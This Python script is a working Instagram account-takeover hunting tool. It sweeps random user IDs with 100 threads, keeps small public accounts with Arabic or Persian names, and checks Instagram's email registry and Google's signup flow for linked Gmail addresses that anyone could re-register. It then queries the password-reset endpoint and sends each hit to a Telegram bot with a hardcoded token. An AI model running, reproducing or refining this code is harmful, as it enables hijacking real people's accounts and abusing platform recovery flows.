import os
# حل مشكلة TERM environment variable not set
os.environ.setdefault('TERM', 'xterm-256color')

import time
import datetime
import base64
import sys
from requests import get
try:
  from bs4 import BeautifulSoup
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent

try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from random import choice
except:
  os.system("pip install random")
  from random import choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
import sys
import subprocess
import base64
import uuid
import random
import time
import json
import string
import hashlib

try:
    import h2
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    import h2

try:
    import httpx
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
    import httpx  
import httpx, uuid, time, random, string, uuid, user_agent  
import signal
import datetime
from rich.console import Console
from rich.table import Table
from rich import box
import re
from threading import Thread  
    
    
def r(n): return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

console = Console()

hits=0
bads_instgram=0
bads_email=0

O = '\x1b[38;5;208m' #برتقالي
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
K = '\033[2;35m'
C1 = '\033[2;35m'
B = '\033[2;36m'#سمائي
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
import json


ids = []
found_usernames = set()


from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

table = Table(
    show_header=False,
    box=box.ASCII,
    pad_edge=False
)

table.add_column(justify="center", width=30)

table.add_row("The Tool By : Guts")
table.add_row("My User : @D1_R4")
table.add_row("")
table.add_row("instagram Hidden followers")


console.print(table)

print("\n")
token=('8738412833:AAH7aXrtQxqF2lq2EYSLI_EEWEFFOjqepLc')
print('')
ID=('5739065274')
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')
                        
def generate_android_ua():
    devices = [
        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
        {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825", "cpu": "exynos1280"},
        {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama", "cpu": "qcom"},
        {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven", "cpu": "gs101"},
        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
        {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
        {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150", "cpu": "qcom"},
        {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845", "cpu": "qcom"},
        {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893", "cpu": "mtk"},
        {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980", "cpu": "hisilicon"},
    ]
    
    device = random.choice(devices)
    
    android_version = random.choice(["10", "11", "12", "13", "14"])
    api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
    dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
    width = random.choice(["720", "1080", "1440"])
    height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
    instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
    locale = random.choice(["en_US", "en_GB", "ar_SA"])
    random_num = random.randint(300000000, 400000000)
    
    ua = (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
          f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
          f"{device['device']}; {device['board']}; {locale}; {random_num})")

    return ua
                        
def rest(user):    
    headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/accounts/password/reset/?source=fxcal',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
    'sec-ch-ua-full-version-list': '"Chromium";v="148.0.7778.168", "Google Chrome";v="148.0.7778.168", "Not/A)Brand";v="99.0.0.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"19.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'x-asbd-id': '359341',
    'x-csrftoken': 'H1CoCux1VkR2aRz7WQsv8lGE95UVqIbM',
    'x-ig-app-id': '936619743392459',
    'x-ig-max-touch-points': '0',
    'x-ig-www-claim': 'hmac.AR3AqgCGaNYKiaGD2p6t-h92EOVCVTLghiUNPQi3RzQ-KVuI',
    'x-instagram-ajax': '1039957696',
    'x-requested-with': 'XMLHttpRequest',
    

}

    
    r = httpx.Client(http2=True, headers=headers, timeout=20).post(
        "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
        data={"email_or_username": user,
            'flow': 'fxcal',
            'jazoest': '22680',
        }
    ).text
    
    try:
        data = json.loads(r)
        if "message" in data:
            import re
            email_match = re.search(r'check\s+([^\s]+?)\s+for a link', data["message"])
            if email_match:
                return email_match.group(1)
            else:
                return "No Rest"
        elif "contact_point" in data:
            return data["contact_point"]
        else:
            return "No Rest"
    except:
        return "No Rest"
    
def info(username, jj):
    global hits
    hits += 1
    if hits % 10 == 0:
        if os.path.exists("tl.txt"):
            os.remove("tl.txt")

    try:
        username = username.split("@")[0]
        headers = {
            "authority": "insta-story.com",
            "accept": "*/*",
            "accept-language": "tr-TR,tr;q=0.9",
            "content-type": "application/json",
            "origin": "https://insta-story.com",
            "referer": f"https://insta-story.com/user/{username}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10) Chrome/137.0.0.0 Mobile"
        }

        json_data = {
            "username": username,
            "visitor_id": str(uuid.uuid4()),
            "user_info": True,
            "user_stories": False,
            "user_highlights": False,
            "user_posts": False
        }

        r = requests.post(
            "https://insta-story.com/api/v1/web/profile",
            headers=headers,
            json=json_data,
            timeout=15
        ).json()

        if r.get("user_info"):
            u = r["user_info"]
            msg = f"""
    Guts
━━━━━━━━━━━━━━━
⌊ Name ⌉  {u.get('full_name', 'Yok')}
⌊ Username ⌉  @{username}
⌊ Email ⌉  {username}@{jj}
⌊ ID ⌉  {u.get('id', 'Yok')}
⌊ Followers ⌉  {u.get('followers', 0)}
⌊ Following ⌉  {u.get('following', 0)}
⌊ Posts ⌉  {u.get('posts', 0)}
⌊ Private ⌉  {"Evet" if u.get("is_private") else "Hayır"}
⌊ URL ⌉  https://www.instagram.com/{username}/
⌊ Rest ⌉ {rest(username)}
━━━━━━━━━━━━━━━
@D1_R4
"""
            print(msg)
            with open('hits1.txt', 'a', encoding='utf-8') as ff:
                ff.write(f'{msg}\n')
            

            try:
                telegram_url = f"https://api.telegram.org/bot{token}/sendMessage"
                response = requests.post(telegram_url, data={
                    "chat_id": ID,
                    "text": msg
                }, timeout=10)
                

                if response.status_code != 200:
                    print(f"Telegram error: {response.text}")
            except Exception as e:
                print(f"Failed to send to Telegram: {e}")
        else:
            raise Exception("No user_info")
            
    except Exception as e:
        print(f"Error in info function: {e}")
        msg = f"""
    Guts
━━━━━━━━━━━━━━━
⌊ Username ⌉  {username}
⌊ Email ⌉  {username}@{jj}
⌊ URL ⌉  https://www.instagram.com/{username}
⌊ Rest ⌉ {rest(username)}
━━━━━━━━━━━━━━━
@D1_R4
"""

        try:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data={"chat_id": ID, "text": msg},
                timeout=10
            )
        except Exception as e:
            print(f"Failed to send fallback to Telegram: {e}")
            
        with open('hits1.txt', 'a', encoding='utf-8') as ff:
            ff.write(f'{msg}\n')
def Guts(email):
  global bads_email
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:
        bads_email+=1

  except:''

def check(email):
  global bads_instgram,hits,bads_email
  try:
    pp=choice('00')
    android_ua = generate_android_ua()
    os.system('clear' if os.name == 'posix' else 'cls')
    tt = (f'''
 {YELLOW}*{YELLOW} {GREEN}Hits Instagram: {hits}{GREEN}
	
 {YELLOW}*{YELLOW} {RED}Bad insta: {bads_instgram}{RED}
	
 {YELLOW}*{YELLOW} {YELLOW}Email Not Available: {bads_email}{YELLOW}
 
 {YELLOW}*{YELLOW} {YELLOW}email:{YELLOW}{email}
	
 {YELLOW}*{YELLOW} {B}By: @D1_R4{B}
	
	''')
    print(tt)
    if pp == '0':


      url = "https://i.instagram.com/api/v1/users/check_email/"
      response = httpx.Client(http2=True).post(url, data=f"email={email}", headers={'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",'content-type': "application/x-www-form-urlencoded; charset=UTF-8"})
      if 'email_is_taken' in str(response.text):Guts(email)
      else:
          bads_instgram+=1
          os.system('clear' if os.name == 'posix' else 'cls')
          tt = (f'''
 {YELLOW}*{YELLOW} {GREEN}Hits Instagram: {hits}{GREEN}
	
 {YELLOW}*{YELLOW} {RED}Bad insta: {bads_instgram}{RED}
	
 {YELLOW}*{YELLOW} {YELLOW}Email Not Available: {bads_email}{YELLOW}
 
 {YELLOW}*{YELLOW} {YELLOW}email:{YELLOW}{email}
	
 {YELLOW}*{YELLOW} {B}By: @D1_R4{B}
	
	''')
          print(tt)
          
    elif pp == '1':
          pass
          
  except:''


def contains_arabic_or_persian(text):

    if not text or not isinstance(text, str):
        return False
    

    arabic_persian_pattern = re.compile(
        '[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]'
    )
    
    return bool(arabic_persian_pattern.search(text))
        
def rand_ids(existing_ids):  
    while True:
        Id = str(random.randrange(8047361473,8717361473))
        if Id not in existing_ids:
            existing_ids.add(Id)
            return Id

def collect_users_1():
    ids_1 = set()
    found_usernames_1 = set()

    def worker():
        global naif
        while True:
            try:
                rnd = str(random.randint(150, 999))
                user_agent_str = (
                    "Instagram 311.0.0.32.118 Android ("
                    + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
                    + "; "
                    + str(random.randint(100, 1300))
                    + "dpi; "
                    + str(random.randint(200, 2000))
                    + "x"
                    + str(random.randint(200, 2000))
                    + "; "
                    + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME", "INFINIX"])
                    + "; SM-T"
                    + rnd
                    + "; SM-T"
                    + rnd
                    + "; qcom; en_US; 545986"
                    + str(random.randint(111, 999))
                    + ")"
                )

                Id = rand_ids(ids_1)
                lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': user_agent_str,
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': lsd,
                }

                data = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': '{"userID":"' + str(Id) + '","username":"cristiano"}',
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001',
                }

                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                
                try:
                    resp_json = response.json()
                except Exception:
                    resp_json = {}

                if 'errors' in resp_json:
                    continue

                user_data = resp_json.get('data', {}).get('user', {})
                if not user_data:
                    continue

                username = user_data.get('username', '')
                full_name = user_data.get('full_name', '')
                
                follower_count = user_data.get('follower_count', 0)
                following_count = user_data.get('following_count', 0)
                media_count = user_data.get('media_count', 0)
                is_private = user_data.get('is_private', True)

                if not username or username in found_usernames_1:
                    continue


                if not contains_arabic_or_persian(full_name):
                    continue

                if any(x in username for x in ["_"]) or len(username) < 9:
                    continue

                if is_private or follower_count>80:
                    continue

                found_usernames_1.add(username)
                email=username+'@gmail.com'
                check(email)
                               

            except Exception as e:
                continue


    for _ in range(100):
        Thread(target=worker).start()

collect_users_1()
